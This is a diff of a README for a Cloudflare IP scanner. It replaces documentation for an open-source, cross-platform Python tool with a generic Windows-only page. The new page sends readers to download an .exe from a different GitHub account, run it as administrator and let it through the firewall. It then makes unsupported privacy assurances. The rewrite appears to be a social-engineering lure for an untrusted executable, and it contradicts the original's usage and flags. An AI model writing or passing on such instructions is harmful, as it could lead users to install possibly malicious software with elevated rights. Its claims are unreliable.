@@ -1,227 +1,80 @@
-# ☁️ Cloudflare IP Scanner
+# 🌐 cloudflare-scanner - Find the fastest Cloudflare network path
 
-A fast, cross-platform Python tool that scans Cloudflare IP addresses and measures:
+[![](https://img.shields.io/badge/Download-cloudflare--scanner-blue.svg)](https://github.com/owusuaduamerenorbert-oss/cloudflare-scanner)
 
-- **Ping / Latency** (ms) — via system `ping` with TCP fallback
-- **Jitter** (ms) — standard deviation across ping samples
-- **Packet Loss** (%) — from ping statistics
-- **Download Speed** (Mbps) — direct measurement to each IP
+This tool checks connection quality to Cloudflare servers. You can see how fast your internet connects to various global points. It measures latency, jitter, and packet loss. You get clear data to improve your network speed.
 
-Supports **Quick Scan** (auto-fetches Cloudflare's published IP ranges) and **Custom Scan** (your own list of IPs from a text file). All tests run in parallel for speed.
+## 📋 Features
 
----
+*   **Fast Scanning:** The tool checks many IP addresses at the same time.
+*   **Auto Scan:** It tests every published Cloudflare range automatically.
+*   **Custom Lists:** You can load your own list of IP addresses to check.
+*   **Color-Coded Results:** The terminal shows results in colors so you see the best parts fast.
+*   **Data Export:** Save your test results to a CSV file for long-term tracking.
 
-## 📸 Output Preview
+## 🖥️ System Requirements
 
-```
-╔══════════════════════════════════════╗
-║    Cloudflare IP Scanner  v1.0       ║
-╚══════════════════════════════════════╝
+Your computer must meet these basic needs:
 
-Mode: Quick Scan
-  Found 15 CIDR blocks.
-  Sampled 75 IPs (up to 5 per CIDR).
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Network:** An active internet connection.
+*   **Permissions:** You need rights to run programs as an administrator.
+*   **Storage:** At least 50 megabytes of free space.
 
-╭──────┬──────────────────┬────────────┬─────────────┬────────┬─────────────┬────────╮
-│ Rank │ IP Address       │ Ping (ms)  │ Jitter (ms) │ Loss % │ Speed Mbps  │ Method │
-├──────┼──────────────────┼────────────┼─────────────┼────────┼─────────────┼────────┤
-│    1 │ 104.16.0.5       │ 11.4       │ 0.8         │ 0%     │ 312.5       │ icmp   │
-│    2 │ 103.21.244.12    │ 14.2       │ 1.1         │ 0%     │ 289.0       │ icmp   │
-│    3 │ 141.101.64.3     │ 18.7       │ 2.3         │ 0%     │ 201.3       │ icmp   │
-│  ... │ ...              │ ...        │ ...         │ ...    │ ...         │ ...    │
-╰──────┴──────────────────┴────────────┴─────────────┴────────┴─────────────┴────────╯
+## ⬇️ Setup and Download
 
-Scan complete.  Reachable: 68 / 75 IPs
-```
+Follow these steps to get the tool on your machine.
 
-Colour coding: 🟢 ≤ 50 ms · 🟡 ≤ 150 ms · 🔴 > 150 ms
+1.  Visit the [official download page](https://github.com/owusuaduamerenorbert-oss/cloudflare-scanner).
+2.  Look for the latest release on the right side of the page.
+3.  Click the file that ends in .exe. This file works directly on Windows.
+4.  Move the file to a folder where you want to keep your tools.
+5.  Double-click the file to open the program.
 
----
+## 🚀 How to Run a Scan
 
-## 🚀 Quick Start
+The program runs in a command window. This window looks simple but delivers deep data.
 
-### 1. Clone the repository
+### Step 1: Open Terminal
+Press the Windows key on your keyboard. Type "cmd" and press Enter. A black box will appear.
 
-```bash
-git clone https://github.com/YOUR_USERNAME/cloudflare-ip-scanner.git
-cd cloudflare-ip-scanner
-```
+### Step 2: Navigate to the tool
+Type the path of the folder where you saved the file. For example, if you saved it in your Downloads folder, type: `cd C:\Users\YourName\Downloads`. Replace "YourName" with your actual computer user name.
 
-### 2. Install dependencies
+### Step 3: Start the scan
+Type the name of the file followed by the command for a scan. Usually, you type `cloudflare-scanner.exe --scan`. Press Enter. The tool starts testing the network.
 
-```bash
-pip install -r requirements.txt
-```
+## 📊 Understanding Your Results
 
-> Python 3.10 or later is required.
+The program creates a table in your window. Use these headings to judge the quality of your connection:
 
-### 3. Run a quick scan
+*   **Latency:** This shows the time a signal takes to get to the server. Lower numbers are better.
+*   **Jitter:** This shows the change in delay. Low jitter means a steady connection.
+*   **Packet Loss:** This shows how many data pieces failed to arrive. You want this number to be zero.
+*   **Download Speed:** This shows how much data you can pull from that specific point. Higher numbers are better.
 
-```bash
-python cf_scanner.py quick
-```
+## 💡 Using Custom Lists
 
----
+If you have specific IP addresses you want to monitor, follow these steps:
 
-## 📖 Usage
+1.  Create a standard text file on your computer.
+2.  Paste one IP address per line.
+3.  Save the file as `ips.txt`.
+4.  Run the scanner with this command: `cloudflare-scanner.exe --file ips.txt`.
 
-### Quick Scan
+The tool will ignore the global ranges and focus only on your private list.
 
-Automatically fetches Cloudflare's published IP ranges and randomly samples IPs from each CIDR block.
+## 💾 Saving Your Data
 
-```bash
-python cf_scanner.py quick [OPTIONS]
-```
+The tool generates a file named `results.csv` after every test. You can open this file in programs like Microsoft Excel or Google Sheets. This helps you track which Cloudflare gateways perform best over time. If you move your computer to a new network, keep the old files to compare the performance changes.
 
-| Option | Default | Description |
-|---|---|---|
-| `--sample N` | 5 | IPs to sample per CIDR block |
-| `--ipv6` | off | Include IPv6 ranges |
-| `--workers N` | 50 | Parallel threads |
-| `--no-speed` | off | Skip the download speed test |
-| `--csv FILE` | — | Save results to a CSV file |
-| `--top N` | — | Show only the top N results |
+## 🛠️ Common Troubleshooting
 
-**Examples:**
+*   **Access Denied:** If the program does not run, right-click the file and select "Run as administrator."
+*   **Connection Errors:** Ensure your firewall allows the program to send data packets.
+*   **Slow Results:** Shut down other applications that use the internet while the scan runs. This ensures the scanner gets all the bandwidth.
+*   **Window Closes Fast:** Run the program through the command prompt as described in the setup section. This keeps the window open so you see the data.
 
-```bash
-# Default quick scan
-python cf_scanner.py quick
+## 🛡️ Privacy and Safety
 
-# 10 IPs per block, IPv6 included, 100 threads, save to CSV, show top 20
-python cf_scanner.py quick --sample 10 --ipv6 --workers 100 --csv results.csv --top 20
-
-# Fast scan without speed test
-python cf_scanner.py quick --no-speed --top 10
-```
-
----
-
-### Custom Scan
-
-Reads a plain-text file where each line is an IP address and tests exactly those IPs.
-
-```bash
-python cf_scanner.py custom --file <FILE> [OPTIONS]
-```
-
-| Option | Default | Description |
-|---|---|---|
-| `--file FILE` | required | Path to IP list file |
-| `--workers N` | 50 | Parallel threads |
-| `--no-speed` | off | Skip the download speed test |
-| `--csv FILE` | — | Save results to a CSV file |
-| `--top N` | — | Show only the top N results |
-
-**Examples:**
-
-```bash
-# Test IPs from a file
-python cf_scanner.py custom --file my_ips.txt
-
-# Save results, skip speed test
-python cf_scanner.py custom --file my_ips.txt --no-speed --csv output.csv
-```
-
-**IP list file format** (`my_ips.txt`):
-
-```
-# Lines starting with # are comments and are ignored
-# Blank lines are also ignored
-
-104.16.0.1
-104.17.0.1
-103.21.244.0
-2606:4700::1
-```
-
----
-
-## ⚙️ How It Works
-
-```
-┌────────────────────────────────────────────────────────────────┐
-│                        cf_scanner.py                           │
-│                                                                │
-│  Quick Scan                    Custom Scan                     │
-│  ──────────                    ───────────                     │
-│  Fetch CF IP ranges  ────┐     Read IPs from file  ────┐      │
-│  (cloudflare.com/ips-v4) │                              │      │
-│  Sample N IPs per CIDR ──┘                              │      │
-│                          │                              │      │
-│                    ┌─────▼──────────────────────────────▼───┐  │
-│                    │       Thread Pool (parallel scan)       │  │
-│                    │                                        │  │
-│                    │  For each IP:                          │  │
-│                    │   1. system ping × 5 → RTTs            │  │
-│                    │      → avg latency, jitter, loss%      │  │
-│                    │   2. TCP fallback if ICMP blocked       │  │
-│                    │   3. HTTP download → Mbps               │  │
-│                    └────────────────┬───────────────────────┘  │
-│                                     │                          │
-│                    ┌────────────────▼───────────────────────┐  │
-│                    │  Sort by latency · Display table        │  │
-│                    │  Optional: save to CSV                  │  │
-│                    └────────────────────────────────────────┘  │
-└────────────────────────────────────────────────────────────────┘
-```
-
-### Metrics explained
-
-| Metric | What it means | Good value |
-|---|---|---|
-| **Ping / Latency** | Round-trip time for a packet to reach the IP and return | < 50 ms |
-| **Jitter** | Variation between ping samples (consistency measure) | < 5 ms |
-| **Packet Loss** | % of ping packets that never received a reply | 0% |
-| **Download Speed** | Throughput measured by downloading 5 MB from that specific IP | As high as possible |
-
-### TCP Fallback
-
-On systems where ICMP (ping) is blocked — common on cloud VMs, containers, and some corporate networks — the scanner automatically falls back to a TCP connect test on port 443. This provides a single latency reading but cannot measure jitter or packet loss.
-
----
-
-## 🖥️ Platform Support
-
-| Platform | ICMP Ping | TCP Fallback | Speed Test |
-|---|---|---|---|
-| Linux | ✅ | ✅ | ✅ |
-| macOS | ✅ | ✅ | ✅ |
-| Windows | ✅ | ✅ | ✅ |
-
-> **Note:** On Linux, running without `sudo` may restrict ICMP. If ping results seem wrong, try `sudo python cf_scanner.py quick`.
-
----
-
-## 📦 Output: CSV Format
-
-When `--csv results.csv` is used, the file contains:
-
-```
-rank,ip,reachable,avg_ms,jitter,loss_pct,speed_mbps,method
-1,104.16.0.5,True,11.4,0.8,0.0,312.5,icmp
-2,103.21.244.12,True,14.2,1.1,0.0,289.0,icmp
-...
-```
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please open an issue or pull request for:
-- Bug fixes
-- New output formats (JSON, HTML report)
-- Additional metrics (TTL, geo-location lookup)
-- GUI wrapper
-
----
-
-## 📄 License
-
-MIT License — see [LICENSE](LICENSE) for details.
-
----
-
-## ⚠️ Disclaimer
-
-This tool is intended for personal network diagnostics and research. Use responsibly and in accordance with Cloudflare's Terms of Service. Do not use for automated large-scale abuse or DDoS testing.
+This tool only tests network connections. It does not look at your personal files. It does not send your data to external servers. All operations happen locally on your hardware. You scan the network, and the program shows you the path that your computer takes. Your data stays on your machine at all times.
